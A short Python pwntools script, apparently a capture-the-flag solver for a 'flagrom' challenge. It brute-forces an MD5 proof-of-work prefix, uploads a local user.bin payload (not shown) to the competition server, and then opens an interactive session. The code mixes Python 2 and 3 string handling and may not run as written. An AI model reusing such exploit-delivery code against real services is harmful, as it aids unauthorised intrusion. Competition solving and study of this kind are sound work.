from pwn import *
import string
import itertools
import re
import hashlib

def brute(l,pre,hpre):
    for _ in range(l-len(pre)):
        for c in itertools.product(string.printable[:-5],repeat=_):
            if hashlib.md5(pre+''.join(c)).hexdigest().startswith(hpre):
                return pre+''.join(c)

r = remote("flagrom.ctfcompetition.com",1337)
#What's a printable string less than 64 bytes that starts with flagrom- whose md5 starts with 42bdac
m = r.recvuntil('\n')
print(m)
m = re.match(r".*less than ([0-9]*) bytes.*with (.*) whose.*with (.*)\?",m.decode('utf-8'))

l = int(m.group(1))
pre = m.group(2) 
hpre = m.group(3)
r.sendline(brute(l,pre,hpre))
print('Go')
f=open("./user.bin","r").read()
r.recvuntil("load?")
r.sendline(str(len(f)))
r.sendline(f)
r.interactive()
